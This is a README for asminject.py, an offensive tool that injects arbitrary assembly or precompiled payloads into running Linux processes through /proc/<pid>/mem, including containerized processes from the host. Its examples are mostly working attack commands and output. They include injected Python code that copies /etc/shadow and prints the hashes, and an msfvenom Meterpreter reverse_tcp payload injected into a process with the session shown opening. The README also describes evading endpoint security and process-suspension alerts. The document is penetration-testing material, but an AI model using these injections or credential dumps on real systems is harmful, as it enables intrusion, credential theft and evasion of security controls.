# asminject.py
*asminject.py* is a heavily-modified fork of [David Buchanan's dlinject project](https://github.com/DavidBuchanan314/dlinject). Injects arbitrary assembly (or precompiled binary) payloads directly into Linux processes without the use of ptrace by accessing /proc/&lt;pid>/mem. Useful for certain post-exploitation scenarios, recovering content from process memory when ptrace is not available, and bypassing some security controls. Can inject into containerized processes from outside of the container, as long as you have root access on the host.

This is a very early, alpha-quality version of this utility.

* [Origins](#origins)
* [Setup](#setup)
* [Examples](#examples)
* [Features](#features)
* [Version History](#version-history)

## Origins

*asminject.py* was written for two primary scenarios in penetration testing within Linux environments:

* Attacking process- and container-level security controls from the perspective of an attacker with root access to the host
* Avoiding detection after successfully exploiting another issue

For example, consider a penetration test in which the tester has obtained root access to a server that hosts many containers. One of the containers processes bank transfers, and has a very robust endpoint security product installed within it. When the pen tester tries to modify the bank transfer data from within the container, the endpoint security software detects and blocks the attempt. *asminject.py* allows the pen tester to inject arbitrary code directly into the banking software's process memory or even the endpoint security product from outside of the container. Like a victim of Descartes' "evil demon", the security software within the container is helpless, because it exists in an environment entirely under the control of the attacker.

The original *dlinject.py* was designed specifically to call the library-loading function in the Linux *ld-x.y.so* library. That capability was broken on modern Linux distributions when GNU hid the library-loading function. *asminject.py* avoids this issue by executing arbitrary assembly code, and this can also help avoid detection by security mechanisms that key off of library-loading events.

## Setup

It's possible to write payloads in pure assembly without referring to libraries. If you're doing that, or using the example payloads that do that, or using a binary payload generated by e.g. *msfvenom*, you can skip this section.

Otherwise, you'll need to examine the list of binaries and libraries that your target process is using, e.g.:

```
# ps auxww | grep python2

user     2144330  0.2  0.1  13908  7864 pts/2    S+   15:30   0:00 python2 ./calling_script.py
                                                                                                                                    
# cat /proc/2144330/maps

560a14849000-560a14896000 r--p 00000000 08:01 3024520                    /usr/bin/python2.7
...omitted for brevity...
7fc63884b000-7fc638870000 r--p 00000000 08:01 3032318                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
...omitted for brevity...
7fc638a10000-7fc638a1f000 r--p 00000000 08:01 3032320                    /usr/lib/x86_64-linux-gnu/libm-2.31.so
...omitted for brevity...
7fc638b54000-7fc638b57000 r--p 00000000 08:01 3016732                    /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
...omitted for brevity...
7fc638b71000-7fc638b72000 r--p 00000000 08:01 3032333                    /usr/lib/x86_64-linux-gnu/libutil-2.31.so
...omitted for brevity...
7fc638b76000-7fc638b77000 r--p 00000000 08:01 3032319                    /usr/lib/x86_64-linux-gnu/libdl-2.31.so
...omitted for brevity...
7fc638b7c000-7fc638b83000 r--p 00000000 08:01 3032329                    /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
...omitted for brevity...
7fc638bc3000-7fc638bc4000 r--p 00000000 08:01 3031631                    /usr/lib/x86_64-linux-gnu/ld-2.31.so                                                                                                               
```

In this case, you could safely call exported functions in eight different binaries. Most of the example payloads will only use one or two, and will match their names based on regexes, but you'll still need to generate a list of the offsets for *asminject* to use. E.g. for this specific copy of */usr/bin/python2.7*:

```
readelf -a --wide /usr/bin/python2.7 | grep DEFAULT | grep FUNC | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | cut -d" " -f3,9 > relative_offsets-some_machine-python2.7.txt
```

If you are injecting code into a containerized process from outside the container, you'll need to use the copy of each binary *from inside the container*, or you'll get the wrong data.

## Examples

### Create a world-readable copy of a file using only Linux syscalls

This code requires no relative offset information, because it's all done using Linux syscalls. It may also help avoid some methods of forensic detection versus using the *cp*, *cat*, or other commands.

```
# python3 ./asminject.py 1876385 asm/x86-64/copy_file_using_syscalls.s --stop-method "slow" --var sourcefile "/etc/passwd" --var destfile "/var/tmp/copy_test.txt"
```

### Execute arbitrary Python code inside an existing Python process

Launch a harmless Python process that simulates one with access to super-secret, sensitive data. Note the use of *python2* specifically. For *python3* target processes, you'll most likely need to use the *--non-pic-binary* option discussed later in this document.

```
$ sudo python2 ./calling_script.py

('args:', ['test of example_class_1'])
[example_method_1] Example input was: test of example_class_1
Press enter to exit when finished
```

In a separate terminal, locate the process and inject some arbitrary Python code into it:

```
# ps auxww | grep python2

user     2144294  0.5  0.1  13908  7828 pts/2    S+   15:20   0:00 python2 ./calling_script.py

# python3 ./asminject.py 2144294 asm/x86-64/execute_python_code.s --relative-offsets relative_offsets-some_machine-python2.7.txt --pause --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"

...omitted for brevity...
[*] Writing assembled binary to /tmp/tmpw5w72z5m.o
[*] Wrote first stage shellcode
[*] Using '/usr/bin/python2.7' for regex placeholder '.+/python[0-9\.]+$' in assembly code
[*] Writing assembled binary to /tmp/tmpzc7wee_q.o
[*] Wrote stage 2 to '/tmp/tmp12ouuz74'
[*] If the target process is operating with a different filesystem root, copy the stage 2 binary to '/tmp/tmp12ouuz74' in the target container before proceeding
Press Enter to continue...
```

If the target process is a container, copy the binary into its filesystem at this time, then press Enter. Otherwise, just go ahead and press Enter.

```
[*] Continuing process...
[+] Done!
```

Back in the other terminal window, run the *fg* command. Python may segfault, but...

```
# cat /tmp/bishopfox.txt 
root:!:18704:0:99999:7:::
daemon:*:18704:0:99999:7:::
bin:*:18704:0:99999:7:::
sys:*:18704:0:99999:7:::
```

### Execute arbitrary PHP code inside an existing PHP process

PHP has a similar "compile and execute this sequence of Ruby source code" method:

```
# readelf -a --wide /usr/bin/php8.1 | grep DEFAULT | grep FUNC | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | cut -d" " -f3,9 > relative_offsets-copyroom-php8.1-2022-05-10-01.txt

# python3 ./asminject.py 1876385 asm/x86-64/execute_php_code.s --relative-offsets relative_offsets-copyroom-php8.1-2022-05-10-01.txt  --stop-method "slow" --var phpcode "echo \\\"Injected PHP code\\\n\\\";" --var phpname PHP
```

### Execute arbitrary Ruby code inside an existing Ruby process

Ruby has a similar "compile and execute this sequence of Ruby source code" method. The current code for it in *asminject.py* has a few limitations, but it does work:

* No ability to require additional Ruby gems
* The targeted process will lock up after the injected code finishes executing

```
# readelf -a --wide /usr/lib/x86_64-linux-gnu/libruby-2.7.so.2.7.4 | grep DEFAULT | grep FUNC | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | sed 's/  / /g' | cut -d" " -f3,9 > relative_offsets-copyroom-libruby-2.7.4-2022-05-10-01.txt

# python3 ./asminject.py 1876194 asm/x86-64/execute_ruby_code.s --relative-offsets relative_offsets-copyroom-libruby-2.7.4-2022-05-10-01.txt  --stop-method "slow" --var rubycode "puts(\\\"Injected Ruby code\\\")"
```


### Inject Meterpreter into an existing process

Launch a harmless process that simulates one with access to super-secret, sensitive data:

```
$ sudo python2 ./calling_script.py

('args:', ['test of example_class_1'])
[example_method_1] Example input was: test of example_class_1
Press enter to exit when finished
```

In a separate terminal, generate a Meterpreter payload, then launch a listener:

```
# msfvenom -p linux/x64/meterpreter/reverse_tcp -f raw -o lmrt11443 LHOST=127.0.0.1 LPORT=11443

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Saved as: lmrt11443

# msfconsole

...omitted for brevity...
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf6 exploit(multi/handler) > set LPORT 11443
LPORT => 11443
msf6 exploit(multi/handler) > exploit

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:11443 
```

In a third terminal, locate the process and inject the Meterpreter payload into it:

```
# ps auxww | grep python2

root     2144475  0.0  0.1  10644  5172 pts/2    S+   15:44   0:00 sudo python2 ./calling_script.py
root     2144476  0.5  0.2  13884  8088 pts/2    S+   15:44   0:00 python2 ./calling_script.py

# python3 ./asminject.py 2144476 asminject/lmrt11443 --pause --precompiled

...omitted for brevity...
[*] Writing assembled binary to /tmp/tmp78ods3rv.o
[*] Wrote first stage shellcode
[*] Wrote stage 2 to '/tmp/tmpcmwfovsm'
[*] If the target process is operating with a different filesystem root, copy the stage 2 binary to '/tmp/tmpcmwfovsm' in the target container before proceeding
Press Enter to continue...
[*] Continuing process...
[+] Done!
```

In the first terminal, run the *fg* command, and you should see the following pop up in the third terminal:

```
[*] Sending stage (3008420 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:11443 -> 127.0.0.1:53682) at 2021-06-07 14:44:14 -0700

meterpreter > sysinfo
Computer     : 192.168.218.135
OS           : Debian  (Linux 5.10.0-kali3-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux

```

### Create a copy of a file using buffered read/write libc calls

If you don't mind making library calls, writing custom code is much easier. This example uses code that (like the first example) creates a copy of a file, but by using libc's fopen(), fread(), fwrite(), and fclose() instead of syscalls, can easily use a buffered approach that's more efficient.

```
# python3 ./asminject.py 1876570 asm/x86-64/copy_file_using_libc.s --relative-offsets relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.33.so-2022-05-05.txt --stop-method "slow" --var sourcefile "/etc/passwd" --var destfile "/var/tmp/copy_test.txt" --debug
```


## Features

### Using "slow" mode to help avoid triggering alerts related to process suspension

*asminject.py* supports four methods for pre/post-injection handling of the target process. Three of those methods are borrowed from the original [dlinject.py](https://github.com/DavidBuchanan314/dlinject):

* Send a suspend (SIGSTOP) signal before injection, and a resume (SIGCONT) message after injection
** This is reliable, but is somewhat intrusive. Very paranoid software might use it as an indication of tampering
* For containerized systems, using *cgroups* "freezing"
** Reliable, but not an option for non-containerized systems
* Do nothing and hope the target process doesn't step on the injected code while it's being written
** Unreliable

*asminject.py* adds a fourth option: increasing the priority of its own process and decreasing the priority of the target process. This "slow" mode generally allows it to act like [Quicksilver in _X-Men: Days of Future Past_](https://youtu.be/T9GFyZ5LREQ?t=32), making its changes to the target process at lightning speed. The target process is still running, but so slowly relative to *asminject.py* that it may as well be suspended.

```
# python3 ./asminject.py 1470158 asm/x86-64/execute_python_code-01.s --relative-offsets asminject/relative_offsets-copyroom-usr-bin-python2.7-2021-08-30.txt --relative-offsets asminject/relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --var pythoncode "print('OK');"  --stop-method "slow" --pause false

...omitted for brevity...
[*] Switching to super slow motion, like every late 1990s/early 2000s action film director did after seeing _The Matrix_...
[*] Current process priority for asminject.py (PID: 1470165) is 0
[*] Current CPU affinity for asminject.py (PID: 1470165) is [0, 1]
[*] Current process priority for target process (PID: 1470158) is 0
[*] Current CPU affinity for target process (PID: 1470158) is [0, 1]
[*] Setting process priority for asminject.py (PID: 1470165) to -20
[*] Setting process priority for target process (PID: 1470158) to 20
[*] Setting CPU affinity for target process (PID: 1470158) to [0, 1]
...omitted for brevity...
[*] Wrote stage 2 to '/tmp/tmppjmn1rr6'
[*] Returning to normal time...
[*] Setting process priority for asminject.py (PID: 1470165) to 0
[*] Setting process priority for target process (PID: 1470158) to 0
[*] Setting CPU affinity for target process (PID: 1470158) to [0, 1]
[+] Done!

```

### Specifying non-PIC code

Some binaries are compiled without the position-independent code build option (including, strangely enough, Python 3.x, even though 2.x had it enabled). This means that the offsets in the corresponding ELF are absolute instead of relative to the base address. If *asminject.py* detects a low base address (typically indicative of this condition), it will include a warning:

```
[*] '/usr/bin/python3.9' has a base address of 4194304, which is very low for position-independent code. If the exploit attempt fails, try adding --non-pic-binary "/usr/bin/python3.9" to your asminject.py options.
```

As the message indicates, this type of binary can be manually flagged using one or more *--non-pic-binary* options, which are parsed as regular expressions. e.g.:

```
# python3 ./asminject.py 1470214 asm/x86-64/execute_python_code-01.s --relative-offsets asminject/relative_offsets-copyroom-usr-bin-python3.9-2021-08-30.txt --relative-offsets asminject/relative_offsets-copyroom-usr-lib-x86_64-linux-gnu-libc-2.31.so-2021-08-30.txt --var pythoncode "print('OK');" --non-pic-binary "/usr/bin/python3\\.[0-9]+" --stop-method "slow" --pause false

...omitted for brevity...
[*] Handling '/usr/bin/python3.9' as non-PIC binary
[*] /usr/bin/python3.9: 0x0000000000000000
...omitted for brevity...
[+] Done!

```

### Multi-architecture support

As of v0.7, *asminject.py* has very basic support for execution in 32-bit ARM versions of Linux, like a Raspberry Pi:

```
# python3 ./asminject.py 18361 asm/arm32/copy_file_using_syscalls.s --arch arm32 --var sourcefile "/etc/passwd" --var destfile "/home/pi/test_copy.txt" --stop-method "slow" --pause false --preserve-temp-files

                     .__            __               __
  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
 / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
        \/                   \/\______|    \/     \/     \/|__|   \/

asminject.py
v0.7
Ben Lincoln, Bishop Fox, 2021-09-02
https://github.com/BishopFox/asminject
based on dlinject, which is Copyright (c) 2019 David Buchanan
dlinject source: https://github.com/DavidBuchanan314/dlinject

[!] A list of relative offsets was not specified. If the injection fails, check your payload to make sure you're including the offsets of any exported functions it calls.
[*] Switching to super slow motion, like every late 1990s/early 2000s action film director did after seeing _The Matrix_...
[*] Current process priority for asminject.py (PID: 18412) is 0
[*] Current CPU affinity for asminject.py (PID: 18412) is [0, 1, 2, 3]
[*] Current process priority for target process (PID: 18361) is 0
[*] Current CPU affinity for target process (PID: 18361) is [0, 1, 2, 3]
[*] Setting process priority for asminject.py (PID: 18412) to -20
[*] Setting process priority for target process (PID: 18361) to 20
[*] Setting CPU affinity for target process (PID: 18361) to [0, 1, 2, 3]
[*] RIP: 0xb6dab668
[*] RSP: 0xbea27248
[*] '/usr/bin/python2.7' has a base address of 65536, which is very low for position-independent code. If the exploit attempt fails, try adding --non-pic-binary "/usr/bin/python2.7" to your asminject.py options.
[*] '0' has a base address of 3117056, which is very low for position-independent code. If the exploit attempt fails, try adding --non-pic-binary "0" to your asminject.py options.
[*] /lib/arm-linux-gnueabihf/ld-2.28.so: 0x00000000b6f52000
[*] /lib/arm-linux-gnueabihf/libc-2.28.so: 0x00000000b6cdb000
[*] /lib/arm-linux-gnueabihf/libdl-2.28.so: 0x00000000b6ee9000
[*] /lib/arm-linux-gnueabihf/libm-2.28.so: 0x00000000b6e29000
[*] /lib/arm-linux-gnueabihf/libpthread-2.28.so: 0x00000000b6efc000
[*] /lib/arm-linux-gnueabihf/libutil-2.28.so: 0x00000000b6ed6000
[*] /lib/arm-linux-gnueabihf/libz.so.1.2.11: 0x00000000b6eab000
[*] /usr/bin/python2.7: 0x0000000000010000
[*] /usr/lib/arm-linux-gnueabihf/libarmmem-v7l.so: 0x00000000b6f3d000
[*] /usr/lib/locale/locale-archive: 0x00000000b67a1000
[*] 0: 0x00000000002f9000
[*] [heap]: 0x00000000015d9000
[*] [sigpage]: 0x00000000bed0a000
[*] [stack]: 0x00000000bea07000
[*] [vdso]: 0x00000000bed0c000
[*] [vectors]: 0x00000000ffff0000
[*] [vvar]: 0x00000000bed0b000
[*] Writing assembled binary to /tmp/tmp_w1dd1w_.o
[*] Converting executable '/tmp/tmp_w1dd1w_.o' to raw binary file /tmp/tmp2g590n5a.o
[*] Wrote first stage shellcode at 00000000b6dab668 in target process 18361
[*] Writing assembled binary to /tmp/tmpb8tocgf8.o
[*] Converting executable '/tmp/tmpb8tocgf8.o' to raw binary file /tmp/tmpw9aq3eke.o
[*] Wrote stage 2 to '/tmp/tmpjty737ff'
[*] Returning to normal time...
[*] Setting process priority for asminject.py (PID: 18412) to 0
[*] Setting process priority for target process (PID: 18361) to 0
[*] Setting CPU affinity for target process (PID: 18361) to [0, 1, 2, 3]
[+] Done!


# cat /home/pi/test_copy.txt 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...omitted for brevity...
```

Currently, only one example shellcode file is provided (copy files using syscalls), and only the file-based stager is available.

### But what about Yama's ptrace_scope restrictions?

If you are an authorized administrator of a Linux system where someone has accidentally set */proc/sys/kernel/yama/ptrace_scope* to 3, or are conducting an authorized penetration test of an environment where that value has been set, see the <a href="ptrace_scope_kernel_module/">ptrace_scope_kernel_module directory</a>.

## Version history

### 0.10 (2022-05-10)

* Python and Ruby injection are working again for x86-64
* PHP injection works now for x86-64
* Copy files using only syscalls and copy files using libc calls are working again for x86-64
* Most of the rearchitecture is complete
* ARM32 code has not been updated yet

### 0.8 (2022-05-06)

* Lots of things are broken
* Major rearchitecture in progress
* No longer crashes python 3 after injected code has finished, though!
* Only the printf.s shellcode is working right now

### 0.7 (2021-09-02)

* Still an internal development build
* First version to include basic support for 32-bit ARM targets
* Made all of the existing x86-64 shellcode files dependent on less specific versions of libraries, where applicable
* Various other bug fixes and enhancements

### 0.6 (2021-09-01)

* Still an internal development build
* Added Ruby injection code
* Improved reliability
* A few other bug fixes

### 0.5 (2021-08-31)

* Still an internal development build
* Added copy-file-using-libc code

### 0.4 (2021-08-31)

* Still an internal development build
* Added copy-file-using-syscalls code

### 0.3 (2021-08-30)

* Still an internal development build
* Implemented "mem" staging method

### 0.2 (2021-08-30)

* Still an internal development build
* Implemented "slow" stop method
* Implemented support for non-PIC binaries, like Python 3.x
* Various bug fixes

### 0.1 (2021-06-07)

* Internal development build
